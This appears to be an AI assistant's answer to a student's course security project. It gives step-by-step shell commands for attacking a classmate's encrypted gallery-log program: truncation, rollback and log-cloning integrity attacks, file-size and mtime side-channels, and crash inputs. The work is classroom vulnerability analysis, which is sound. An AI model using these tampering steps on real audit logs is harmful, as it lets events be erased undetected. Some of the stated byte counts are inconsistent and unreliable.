
Here are the step-by-step instructions to execute and document these three attacks for your Phase 2 vulnerability analysis.

According to the project guidelines, you must submit a vulnerability analysis document (PDF) detailing the attacks, any code or scripts used, and the test cases that demonstrate them.

Here is exactly how to run them in your terminal:

### 1. The Truncation Attack (Integrity Violation)

**Objective:** Prove you can modify the log without the token, and `logread` will still accept it.

**Step 1: Generate a valid log file**

Run these commands to create a log with two entries.

Bash

```
./logappend -T 1 -K secret_token -A -E Alice log_trunc
./logappend -T 2 -K secret_token -A -E Bob log_trunc
```

**Step 2: Tamper with the log file (Without the token)**

Since the code only encrypts line-by-line and doesn't authenticate the total file length, you can just delete the last line. Use the `head` command to strip the last line and overwrite the file:

Bash

```
head -n -1 log_trunc > temp_log && mv temp_log log_trunc
```

**Step 3: Prove the vulnerability**

Run `logread` with the correct token to read the tampered file:

Bash

```
./logread -K secret_token -S log_trunc
```

- **What happens:** It prints `Alice` and exits with code 0.
    
- **Why it's a violation:** Because the file was modified outside of `logappend`, a fully secure program should have printed `integrity violation` and exited with code `111`.
    

---

### 2. Ciphertext Length Leakage (Confidentiality Violation)

**Objective:** Prove you can infer information about the log's contents without the token.

**Step 1: Generate logs with varying inputs**

Create two separate logs with different guest names (one short, one long).

Bash

```
./logappend -T 1 -K secret_token -A -G Ed log_short
./logappend -T 1 -K secret_token -A -G Christopher log_long
```

**Step 2: Inspect the file sizes (Without the token)**

Use the `wc -c` (word count - bytes) command to look at the exact byte size of the logs.

Bash

```
wc -c log_short log_long
```

**Step 3: Prove the vulnerability in your report**

- **What happens:** You will see that `log_long` is exactly 12 bytes larger than `log_short`. (The name "Christopher" is 11 characters, "Ed" is 2 characters; the base64 encoding of the AES-CCM stream cipher scales linearly with the plaintext JSON).
    
- **Why it's a violation:** You can explain in your report that an attacker monitoring the file system can deduce the exact length of a person's name entering the gallery. If an attacker knows the roster of employees, they can easily guess who entered based purely on the byte-size of the file additions, which constitutes a successful guess of the log's contents.
    

---

### 3. The Unhandled Exception (Crash Violation)

**Objective:** Provide a testcase that causes the program to unexpectedly terminate.

**Step 1: Create the malicious batch file**

Create a text file named `crash_batch.txt` that contains a single line with an unclosed double-quote. You can do this via the terminal:

Bash

```
echo '-K secret -T 1 -A -E "John' > crash_batch.txt
```

**Step 2: Execute the crash**

Run `logappend` in batch mode, passing it the malicious file:

Bash

```
./logappend -B crash_batch.txt
```

**Step 3: Document the crash**

- **What happens:** The terminal will output a Python `ValueError: No closing quotation` traceback because `shlex.split(line)` in `logappend.py` fails to parse the unclosed quote before the script's `try/except` block can catch it.
    
- **Why it's a violation:** The specification states that invalid commands should result in the program printing `invalid` and returning `111`. Crashing with an unhandled Python traceback violates the requirement that an attacker should not be able to crash the tools. Include a screenshot or copy-paste of the Python traceback in your report as proof.
  
  
___

Here are 15 distinct attacks—five for each category—based directly on the implementation details of your colleagues' codebase. You can use these to thoroughly populate your vulnerability analysis report.

### 1. Integrity Violations

An integrity violation occurs when an attacker successfully modifies a log without knowledge of the token used to produce it, and the modified file is correctly interpreted by `logread`.

**1. The Truncation Attack (Line Deletion)**

- **Concept:** AES-CCM encrypts entries line-by-line using an incrementing sequence number (`seq`), but there is no cryptographic seal over the file's total length.
    
- **Execution:** Delete the last line(s) of the log using a text editor or `head -n -1 log1 > temp && mv temp log1`.
    
- **Result:** `logread` will process the remaining lines perfectly without throwing an "integrity violation".
    

**2. The Rollback Attack (State Reversion)**

- **Concept:** Because the system does not use a central counter or external state to track the most recent log update, it cannot prevent a rollback to a valid previous state.
    
- **Execution:** Copy a valid log file at time $T_1$ (`cp log1 log1_backup`). Allow users to legitimately append to `log1` until time $T_2$. Then, overwrite the current log with the backup (`cp log1_backup log1`).
    
- **Result:** `logread` accepts the old file, effectively erasing all events between $T_1$ and $T_2$.
    

**3. Whitespace Injection**

- **Concept:** In `log_format.py`, the `_read_entry_lines` function actively strips out empty lines (`if line.strip()`) _before_ applying the `seq` enumeration.
    
- **Execution:** Open the log file in a text editor and insert blank lines or spaces between the base64-encoded encrypted strings.
    
- **Result:** The file hash/signature has technically been modified by an unauthorized party, but `logread` will completely ignore the injected bytes, realign the sequence numbers, and accept the file without throwing an error.
    

**4. Complete History Wipe (Header-Only Attack)**

- **Concept:** The file header (salt + HMAC verifier) is 48 bytes long. If the entire history of the log is deleted, `read_entries` will just return an empty list `[]`.
    
- **Execution:** Use the `head` command to truncate the file to exactly 48 bytes: `head -c 48 log1 > temp && mv temp log1`.
    
- **Result:** `logread -S` will read the valid header, authenticate it successfully, and print an empty gallery state (two blank lines) rather than detecting that the history was maliciously destroyed.
    

**5. Cross-File Overwrite (The "Cloning" Attack)**

- **Concept:** If a gallery uses the same secure token for multiple logs (e.g., `log_monday` and `log_tuesday`), the HMAC verifier in the header will pass for that token regardless of which file it is in.
    
- **Execution:** Overwrite `log_tuesday` entirely with the contents of `log_monday` (`cp log_monday log_tuesday`).
    
- **Result:** Even though `log_tuesday` was tampered with outside the application, `logread` will accept the copied file as perfectly valid because the token matches the header.
    

---

### 2. Confidentiality Violations

A confidentiality violation occurs when an attacker can infer information about the contents of a log without knowledge of the token.

**1. Name Length Leakage (Ciphertext Size Side-Channel)**

- **Concept:** The code serializes entries into JSON and encrypts them using AES-CCM (a stream cipher) before base64 encoding them. There is no padding.
    
- **Execution:** Compare the byte size of two logs. A log containing the name "Bob" (3 chars) will be exactly 8 bytes smaller (in base64) than a log containing "Christopher" (11 chars).
    
- **Result:** An attacker who knows the employee roster can guess exactly who entered the room by simply looking at the file size difference when a new line is appended.
    

**2. Action Type Leakage (Room vs. Gallery)**

- **Concept:** The JSON encoding handles empty rooms differently than occupied rooms. A gallery arrival looks like `"room": null`, while a room arrival looks like `"room": 1`.
    
- **Execution:** Inspect the byte size of a newly appended line. Because the string `null` is 4 characters long and the integer `1` is 1 character long, entering the gallery creates a structurally longer ciphertext than entering a single-digit room.
    
- **Result:** An attacker can definitively infer whether an event was a gallery entry/departure or a room entry/departure without decrypting the data.
    

**3. Timestamp Magnitude Inference**

- **Concept:** Timestamps are stored as integers in the JSON. An event at $T=99$ is stored as `"T": 99` (2 bytes), while an event at $T=100$ is `"T": 100` (3 bytes).
    
- **Execution:** Monitor the base64 line lengths over time.
    
- **Result:** When the line length jumps by a few bytes, the attacker can infer that the gallery has crossed a specific time threshold (e.g., crossing from double-digit to triple-digit seconds since opening), leaking the rough timestamp of the event.
    

**4. Exact Event Count Leakage**

- **Concept:** `logappend.py` writes exactly one newline character per event.
    
- **Execution:** Run a line-count utility on the log file: `wc -l log1`. Subtract 1 for the header (if it contains a newline, though in this case it's raw bytes, so you just count the base64 lines).
    
- **Result:** The attacker learns the exact number of movements (arrivals and departures) that have occurred in the gallery, violating the requirement that an attacker should not learn facts about the times or events.
    

**5. Traffic Analysis (Time of Action Side-Channel)**

- **Concept:** The application writes to the log file in real-time as events happen.
    
- **Execution:** An attacker sets up a simple script to monitor the OS-level file modification time (`mtime`) of the log file: `stat -c %Y log1`.
    
- **Result:** Even if the timestamps inside the log are encrypted, the attacker learns the exact real-world time that people are moving around the gallery.
    

---

### 3. Crash Violations

A crash occurs when a program unexpectedly terminates, for example, due to a memory-safety violation or unhandled exception. According to specifications, invalid states should cleanly print "invalid" to stdout and exit with code 111.

**1. Batch Mode Unclosed Quote (`shlex` exception)**

- **Concept:** In `logappend.py`, the `shlex.split(line)` function is called outside of the `try...except` block designed to catch argument errors.
    
- **Execution:** Create a batch file containing `-K secret -T 1 -A -E "John` (missing the closing quote) and run `./logappend -B bad_batch`.
    
- **Result:** The program crashes with a Python `ValueError: No closing quotation` traceback instead of printing "invalid" and returning 111.
    

**2. Directory as a Log File (Unhandled `IsADirectoryError`)**

- **Concept:** The code does not verify if the target destination is actually a file before attempting to open it in write/read mode.
    
- **Execution:** Provide a directory path instead of a file path for the log: `./logappend -T 1 -K secret -A -E Alice /tmp`
    
- **Result:** Python's `open()` function will throw an unhandled `IsADirectoryError` (or `PermissionError` on Windows), crashing the application.
    

**3. Directory as a Batch File (Unhandled `IsADirectoryError`)**

- **Concept:** In `run_batch`, the code only explicitly catches `FileNotFoundError`.
    
- **Execution:** Pass a directory to the batch flag: `./logappend -B /tmp`.
    
- **Result:** The script crashes with an `IsADirectoryError` traceback, completely bypassing the required exit code 111 protocol.
    

**4. Invalid Character Encoding in Batch File**

- **Concept:** The batch file is opened using Python's default text mode (`open(batch_file, 'r')`). It does not specify UTF-8 and does not handle decoding errors.
    
- **Execution:** Create a batch file and inject invalid/corrupted byte sequences (e.g., using `printf '\xFF\xFE' > bad_batch`), then run `./logappend -B bad_batch`.
    
- **Result:** The `f.readlines()` call throws a `UnicodeDecodeError`, abruptly crashing the program.
    

**5. Standard Argparse Error Handling Bypass**

- **Concept:** The `argparse` library has default behaviors for missing required positional arguments or invalid flags, which print usage instructions to `stderr` and exit with code `2`.
    
- **Execution:** Run `./logread -K secret -S` (deliberately forgetting the `<log>` positional argument) or run it with an invalid flag like `./logread -Z`.
    
- **Result:** `argparse` intercepts this before your colleagues' `validate_args` function can run. It prints to `stderr` and exits with `2`. The specifications strictly state: "If logread is invoked with an incomplete... command line, it should print "invalid" to stdout and exit, returning 111".

___

Here are the exact tools and terminal commands you need to execute all 15 attacks.

You do not need any specialized hacking software for this. Because the vulnerabilities are logical and cryptographic flaws in the Python implementation, you only need standard Linux command-line utilities (often called `coreutils`) like `head`, `cp`, `wc`, `stat`, and `echo`.

Ensure you have run `make` first so the `logappend` and `logread` bash wrappers are generated and executable.

---

### 1. Integrity Violations

**Tools used:** `head`, `cp`, `echo`

**1. The Truncation Attack (Line Deletion)**

Bash

```
# Setup: Create a log with two entries
./logappend -T 1 -K secret -A -E Alice log_trunc
./logappend -T 2 -K secret -A -E Bob log_trunc

# Attack: Delete the last line using 'head'
head -n -1 log_trunc > temp_log && mv temp_log log_trunc

# Verify: It accepts the truncated file without error
./logread -K secret -S log_trunc
```

**2. The Rollback Attack (State Reversion)**

Bash

```
# Setup: Create initial state and back it up using 'cp'
./logappend -T 1 -K secret -A -E Alice log_rollback
cp log_rollback log_backup

# User legitimately adds more data
./logappend -T 2 -K secret -A -E Bob log_rollback

# Attack: Restore the old state
cp log_backup log_rollback

# Verify: Bob's entry is wiped without an integrity error
./logread -K secret -S log_rollback
```

**3. Whitespace Injection**

Bash

```
# Setup: Create a valid log
./logappend -T 1 -K secret -A -E Alice log_space

# Attack: Inject empty lines into the log using 'echo'
echo "" >> log_space
echo "    " >> log_space

# Verify: logread strips the spaces and accepts the file
./logread -K secret -S log_space
```

**4. Complete History Wipe (Header-Only Attack)**

Bash

```
# Setup: Create a populated log
./logappend -T 1 -K secret -A -E Alice log_wipe
./logappend -T 2 -K secret -A -E Bob log_wipe

# Attack: Keep only the first 48 bytes (16 byte salt + 32 byte HMAC verifier)
head -c 48 log_wipe > temp_log && mv temp_log log_wipe

# Verify: Prints empty gallery instead of detecting destruction
./logread -K secret -S log_wipe
```

**5. Cross-File Overwrite (The "Cloning" Attack)**

Bash

```
# Setup: Create two separate logs using the same token
./logappend -T 1 -K secret -A -E Alice log_monday
./logappend -T 2 -K secret -A -E Bob log_tuesday

# Attack: Overwrite Tuesday with Monday
cp log_monday log_tuesday

# Verify: log_tuesday is accepted as valid despite being replaced
./logread -K secret -S log_tuesday
```

---

### 2. Confidentiality Violations

**Tools used:** `wc` (word count), `stat` (file statistics)

**1. Name Length Leakage**

Bash

```
# Setup: Append two different names
./logappend -T 1 -K secret -A -G Ed log_names_short
./logappend -T 1 -K secret -A -G Christopher log_names_long

# Attack: Use 'wc -c' (byte count) to compare sizes
wc -c log_names_short log_names_long
# Result: You will see log_names_long is larger, leaking the guest's name length.
```

**2. Action Type Leakage (Room vs. Gallery)**

Bash

```
# Setup: Append a gallery arrival vs a room arrival
./logappend -T 1 -K secret -A -G Alice log_gallery
./logappend -T 1 -K secret -A -G Alice -R 1 log_room

# Attack: Compare byte sizes
wc -c log_gallery log_room
# Result: The gallery log will be larger because 'null' (4 chars) is longer than '1' (1 char).
```

**3. Timestamp Magnitude Inference**

Bash

```
# Setup: Append early time vs late time
./logappend -T 9 -K secret -A -E Bob log_early
./logappend -T 1000 -K secret -A -E Bob log_late

# Attack: Compare byte sizes
wc -c log_early log_late
# Result: log_late is larger, revealing the timestamp crossed a magnitude threshold.
```

**4. Exact Event Count Leakage**

Bash

```
# Setup: Create a log with multiple events
./logappend -T 1 -K secret -A -E Alice log_count
./logappend -T 2 -K secret -A -E Bob log_count

# Attack: Use 'wc -l' (line count) 
wc -l log_count
# Result: Subtract 1 (or 2 depending on how the binary header is counted by wc) to get the exact number of events.
```

**5. Traffic Analysis (Time of Action)**

Bash

```
# Setup: Append an event
./logappend -T 1 -K secret -A -E Alice log_traffic

# Attack: Use 'stat' to read the OS modification time
stat -c %y log_traffic
# Result: Leaks the exact real-world time the gallery event took place.
```

---

### 3. Crash Violations

**Tools used:** `echo`, `printf`, `mkdir`

**1. Batch Mode Unclosed Quote**

Bash

```
# Attack: Create a batch file with a syntax error and run it
echo '-K secret -T 1 -A -E "John' > bad_batch.txt
./logappend -B bad_batch.txt
# Result: Python ValueError traceback.
```

**2. Directory as a Log File**

Bash

```
# Attack: Create a directory and pass it as the log file destination
mkdir /tmp/bad_log_dir
./logappend -T 1 -K secret -A -E Alice /tmp/bad_log_dir
# Result: Python IsADirectoryError traceback.
```

**3. Directory as a Batch File**

Bash

```
# Attack: Pass a directory to the batch command
mkdir bad_batch_dir
./logappend -B bad_batch_dir
# Result: Python IsADirectoryError traceback.
```

**4. Invalid Character Encoding in Batch File**

Bash

```
# Attack: Inject raw hexadecimal bytes that are invalid in UTF-8 into a file
printf '\xFF\xFE' > bad_encoding_batch
./logappend -B bad_encoding_batch
# Result: Python UnicodeDecodeError traceback.
```

**5. Standard Argparse Error Handling Bypass**

Bash

```
# Attack: Omit the required positional <log> argument
./logread -K secret -S
# Result: Instead of printing "invalid\n" and exiting with 111, argparse prints standard usage documentation to stderr and exits with 2.
```